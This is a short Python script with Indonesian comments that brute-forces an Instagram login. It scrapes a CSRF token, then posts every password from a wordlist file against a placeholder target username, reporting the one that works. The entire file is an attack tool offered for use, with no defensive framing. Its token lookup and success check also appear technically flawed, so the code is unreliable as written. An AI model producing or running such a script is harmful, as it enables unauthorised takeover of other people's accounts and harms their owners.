import requests
from bs4 import BeautifulSoup
import time

# Fungsi untuk melakukan brute force
def brute_force_instagram(username, password_list):
    # URL login Instagram
    login_url = 'https://www.instagram.com/accounts/login/'

    # Memulai sesi
    session = requests.Session()

    # Membuka halaman login
    response = session.get(login_url)
    soup = BeautifulSoup(response.text, 'html.parser')

    # Mencari token CSRF
    csrf_token = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']

    # Membuka file password list
    with open(password_list, 'r') as file:
        passwords = file.readlines()

    # Loop melalui daftar password
    for password in passwords:
        password = password.strip()
        print(f'Mencoba password: {password}')

        # Data login
        login_data = {
            'username': username,
            'password': password,
            'csrfmiddlewaretoken': csrf_token
        }

        # Mengirim permintaan login
        response = session.post(login_url, data=login_data, allow_redirects=True)

        # Memeriksa apakah login berhasil
        if 'authenticated' in response.url:
            print(f'Password ditemukan: {password}')
            return password
        else:
            print(f'Password salah: {password}')

        # Menunggu sebentar sebelum mencoba password berikutnya
        time.sleep(1)

    print('Password tidak ditemukan dalam daftar yang diberikan.')
    return None

# Contoh penggunaan
username = 'target_username'
password_list = 'passwords.txt'
brute_force_instagram(username, password_list)